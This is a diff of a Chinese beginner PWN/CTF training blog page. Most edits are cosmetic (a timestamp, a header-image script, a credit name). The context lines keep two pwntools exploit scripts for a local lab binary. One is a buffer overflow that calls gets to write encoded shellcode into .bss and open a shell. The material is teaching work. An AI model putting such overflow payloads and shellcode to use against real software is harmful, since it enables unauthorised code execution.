@@ -29,7 +29,7 @@
 <meta property="og:image" content="https://qianfei11.github.io/pics/BIN集训/PWN/二/8.png">
 <meta property="og:image" content="https://qianfei11.github.io/pics/BIN集训/PWN/二/9.png">
 <meta property="og:image" content="https://qianfei11.github.io/pics/BIN集训/PWN/二/10.png">
-<meta property="og:updated_time" content="2019-02-28T05:59:34.733Z">
+<meta property="og:updated_time" content="2019-05-02T15:36:50.536Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="PWN入门（二）">
 <meta name="twitter:description" content="初涉PWN。">
@@ -70,31 +70,9 @@
 
 
   
-  
-  <div class="site-header-image">
-    <img id="originBg" width="100%" alt="Hike News" src>
-  </div>
-
-  <div id="header-blur" class="site-header-image blur" style="position: absolute; top:0; height: 207px; min-height: 207px; min-width: 100%;">
-    <img id="blurBg" width="100%" style="top: 96%" alt="Hike News" src>
-  </div>
-
-  <script>
-        var imgUrls = "css/images/pose01.jpg".split(",");
-        var random = Math.floor((Math.random() * imgUrls.length ));
-        if (imgUrls[random].startsWith('http') || imgUrls[random].indexOf('://') >= 0) {
-          document.getElementById("originBg").src=imgUrls[random];
-          document.getElementById("blurBg").src=imgUrls[random];
-        } else {
-          document.getElementById("originBg").src='/' + imgUrls[random];
-          document.getElementById("blurBg").src='/' + imgUrls[random];
-        }
-    </script>
 
 
-
-
-<header id="allheader" class="site-header" role="banner" style="width: 100%; position: absolute; top:0; background: rgba(255,255,255,.8);">
+<header id="allheader" class="site-header" role="banner">
   <div class="clearfix container">
       <div class="site-branding">
 
@@ -317,7 +295,6 @@
 <tbody>
 <tr>
 <td style="text-align:center">process()</td>
-<td style="text-align:center"></td>
 </tr>
 <tr>
 <td style="text-align:center">sendline()</td>
@@ -386,7 +363,7 @@
 <p>故payload为：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./3-13'</span>)</span><br><span class="line">payload = <span class="string">'\0'</span> * <span class="number">104</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <p>这里的<code>\0</code>也就是<code>\x00</code>，而如果输入的是字符<code>0</code>，转为十六进制后为<code>\x30</code>，将不能满足条件，无法getshell。</p>
-<p>这题附上老梅的payload，这里可以放shellcode：</p>
+<p>这题附上梅大佬的payload，这里可以放shellcode：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">offset=<span class="number">116</span></span><br><span class="line">r=process(<span class="string">"3-13"</span>)</span><br><span class="line">elf=ELF(<span class="string">"3-13"</span>)</span><br><span class="line">bss=elf.bss()</span><br><span class="line">get=elf.symbols[<span class="string">'gets'</span>]</span><br><span class="line">shell=<span class="string">"\xeb\x1b\x5f\x31\xc0\x6a\x53\x6a\x18\x59\x49\x5b\x8a\x04\x0f\xf6\xd3\x30\xd8\x88\x04\x0f\x50\x85\xc9\x75\xef\xeb\x05\xe8\xe0\xff\xff\xff\x1c\x7f\xc5\xf9\xbe\xa3\xe4\xff\xb8\xff\xb2\xf4\x1f\x95\x4e\xfe\x25\x97\x93\x30\xb6\x39\xb2\x2c"</span></span><br><span class="line">payload=<span class="string">"A"</span>*offset+p32(get)+p32(bss)+p32(bss)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(shell)</span><br><span class="line">r.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 <h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://zh.wikipedia.org/wiki/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA</a><br><a href="https://paper.seebug.org/481/" target="_blank" rel="noopener">https://paper.seebug.org/481/</a><br><a href="https://bbs.pediy.com/thread-212691.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-212691.htm</a><br><a href="http://blog.xiyoulinux.org/detail.jsp?id=1965" target="_blank" rel="noopener">http://blog.xiyoulinux.org/detail.jsp?id=1965</a><br><a href="http://www.cnitblog.com/houcy/archive/2013/03/16/87075.html" target="_blank" rel="noopener">http://www.cnitblog.com/houcy/archive/2013/03/16/87075.html</a><br><a href="https://blog.csdn.net/qq_29343201/article/details/51337025" target="_blank" rel="noopener">https://blog.csdn.net/qq_29343201/article/details/51337025</a><br><a href="http://www.91ri.org/14382.html" target="_blank" rel="noopener">http://www.91ri.org/14382.html</a></p>
 
@@ -503,9 +480,6 @@
 
 
     <!-- headerblur min height -->
-    
-      var headerblur = document.getElementById("header-blur");
-      headerblur.style.minHeight = window.getComputedStyle(document.getElementById("allheader"), null).height;
     
     
 </script>
